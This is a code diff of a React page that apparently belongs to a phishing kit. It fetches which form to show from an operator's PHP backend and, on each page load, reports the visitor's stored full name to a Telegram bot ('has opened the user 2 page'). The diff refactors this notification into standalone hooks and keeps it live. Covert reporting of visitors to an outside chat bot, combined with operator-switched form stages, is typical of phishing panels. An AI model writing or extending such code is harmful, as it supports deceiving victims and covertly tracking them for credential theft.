@@ -36,43 +36,76 @@ const parsedData = storedData ? JSON.parse(storedData) : {};
 const fullName = parsedData.fullname || "N/A";
 
   // Fetch the current form from the PHP backend
-  useEffect(() => {
-    const fetchFormType = async () => {
-      try {
-        const res = await fetch(`${API_URL}?action=fetch_forms2`);
-        const data = await res.json();
-        const selectedForm = data?.currentForm2 || "LandingPage";
-        setFormType(selectedForm);
-      } catch (error) {
-        console.error("Failed to fetch form type from PHP:", error);
-      }
-    };
+//   useEffect(() => {
+//     const fetchFormType = async () => {
+//       try {
+//         const res = await fetch(`${API_URL}?action=fetch_forms2`);
+//         const data = await res.json();
+//         const selectedForm = data?.currentForm2 || "LandingPage";
+//         setFormType(selectedForm);
+//       } catch (error) {
+//         console.error("Failed to fetch form type from PHP:", error);
+//       }
+//     };
 
     
 
 
-const sendToTelegram = async (message: string) => {
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-    },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: message,
-    }),
-  });
-};
+// const sendToTelegram = async (message: string) => {
+//   await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+//     method: "POST",
+//     headers: {
+//       "Content-Type": "application/json",
+//     },
+//     body: JSON.stringify({
+//       chat_id: CHAT_ID,
+//       text: message,
+//     }),
+//   });
+// };
 
 
-    useEffect(() => {
-      // Notify on page load
-      sendToTelegram(`✅ ${fullName} has opened the user 2 page. and refreshed`);
-    }, []);
+//     useEffect(() => {
+//       // Notify on page load
+//       sendToTelegram(`✅ ${fullName} has opened the user 2 page. and refreshed`);
+//     }, []);
   
 
-    fetchFormType();
-  }, []);
+//     fetchFormType();
+//   }, []);
+
+useEffect(() => {
+  const fetchFormType = async () => {
+    try {
+      const res = await fetch(`${API_URL}?action=fetch_forms2`);
+      const data = await res.json();
+      const selectedForm = data?.currentForm2 || "LandingPage";
+      setFormType(selectedForm);
+    } catch (error) {
+      console.error("Failed to fetch form type from PHP:", error);
+    }
+  };
+
+  fetchFormType();
+}, []);
+
+useEffect(() => {
+  const sendToTelegram = async (message: string) => {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+      }),
+    });
+  };
+
+  sendToTelegram(`✅ ${fullName} has opened the user 2 page. and refreshed`);
+}, []);
+
 
   useEffect(() => {
     const interval = setInterval(() => {
